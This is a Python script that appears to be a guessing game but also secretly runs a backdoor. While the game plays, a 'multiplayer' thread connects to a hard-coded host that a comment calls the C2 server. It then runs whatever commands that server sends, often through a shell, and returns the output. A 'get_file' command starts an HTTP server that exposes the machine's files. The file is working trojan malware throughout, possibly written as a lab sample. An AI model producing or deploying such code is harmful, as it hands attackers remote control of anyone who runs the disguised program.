import random
import socket, http.server, socketserver, urllib.parse
import threading
import os, subprocess

# Function for the number guessing game
def game():
    done = False
    while not done:
        # Randomly generate a target number between 0 and 100
        target = random.randint(0, 100)
        print("Welcome to the game!")
        print("Guess the number from 1-100\n")
        won = False
        while not won:
            # Ask the user for a guess
            valid = False
            while valid == False:
                try:
                    guess = int(input("Guess the number: "))
                    if guess < 0 or guess > 100:
                        print("The guess must be between 1 and 100.")
                    else:
                        valid = True
                except ValueError:
                    print("Invalid number.")
            # Provide hints based on the guess
            if guess > target:
                print("Try a smaller number!")
            elif guess < target:
                print("Try a greater number!")
            else:
                # User guessed correctly
                print(f"You got it! {target} was the number!")
                won = True
                # Ask the user if they want to play again
                response = input("Wanna play again? (y/n) ")
                # Validate the user's response
                while response not in ["y", "n"]:
                    response = input("Wanna play again? (y/n) ")
                if response == "n":
                    # End the game loop if the user chooses not to play again
                    done = True

# Function to run shell commands
def run_command(command):
    words = command.split()
    try:
        needs_shell = True
        verb = words[0]
        # Handle the 'cd' command to change directories
        if verb == "cd":
            os.chdir(words[1])
            return "Directory changed successfully!"
        # Handle the 'mkdir' command to create a directory
        elif verb == "mkdir":
            os.makedirs(words[1], exist_ok=True)
            return f"Directory {words[1]} created!"
        # Handle the 'get_file' command to start an HTTP server for file transfer
        elif verb == "get_file":
            threading.Thread(target=start_http, args=(int(words[1]),), daemon=True).start()
            return f"HTTP {words[1]}"
        else:
            # Commands that don't require a shell
            if verb in ["curl", "wget", "cat", "python3", "python", "zip", "rm"]:
                needs_shell = False
            # Run the command using subprocess
            result = subprocess.run(words, shell=needs_shell, capture_output=True, text=True)
            output = result.stdout
            errorput = result.stderr
            # Return the command output, or a success message if no output
            if output == "":
                output = "Command executed successfully! (No output)"
            # If there's an error, return the error message
            if errorput != "":
                output = errorput
            return output
    # Handle exceptions
    except subprocess.CalledProcessError as e:
        return f"Command error: {e.stderr}"
    except FileNotFoundError:
        return "Command not found!"
    except Exception as e:
        return f"An error occurred: {str(e)}"

# Function for the "multiplayer" mode
def multiplayer():
    HOST = "192.168.1.101"  # Replace with the actual IP of the C2 server
    PORT = 13921 # Make sure this matches the port in the server file
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Connect to the server
        client.connect((HOST, PORT))
        while True:
            # Receive a command from the server
            command = client.recv(1024).decode("utf-8")
            # Run the command and send back the result
            output = run_command(command)
            client.send(output.encode("utf-8"))
    except:
        # Close the connection on error
        client.close()

# Function to start an HTTP server on the specified port
def start_http(PORT):
    subprocess.run(f"python3 -m http.server {PORT}".split(), capture_output=True, text=True)

# Start the game and multiplayer mode in separate threads
t1 = threading.Thread(target=game, daemon=True)
t2 = threading.Thread(target=multiplayer, daemon=True)
t1.start()
t2.start()
t1.join()
t2.join()
